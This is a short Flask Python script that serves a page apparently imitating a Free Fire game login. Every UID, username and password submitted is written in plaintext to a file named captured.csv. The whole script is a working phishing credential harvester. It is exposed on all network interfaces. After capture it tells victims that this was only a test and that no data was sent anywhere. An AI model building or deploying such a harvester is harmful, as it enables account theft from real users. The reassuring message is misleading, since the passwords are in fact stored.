from flask import Flask, request, send_from_directory
import datetime
import csv
import os

app = Flask(__name__)

@app.route('/')
def index():
    return send_from_directory('.', 'freeFire.html')

@app.route('/login', methods=['POST'])
def login():
    uid = request.form.get('uid', 'N/A')
    username = request.form.get('username')
    password = request.form.get('password')

    file_exists = os.path.exists('captured.csv')

    with open('captured.csv', 'a', newline='') as f:
        writer = csv.writer(f)

        if not file_exists or os.stat('captured.csv').st_size == 0:
            writer.writerow(["Timestamp", "UID", "Username", "Password"])
        writer.writerow([datetime.datetime.now(), uid, username, password])

    return "<h3>Simulation Complete</h3><p>This is a phishing test. No data was sent anywhere.</p>"

@app.route('/assets/<path:filename>')
def serve_assets(filename):
    return send_from_directory('assets', filename)


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
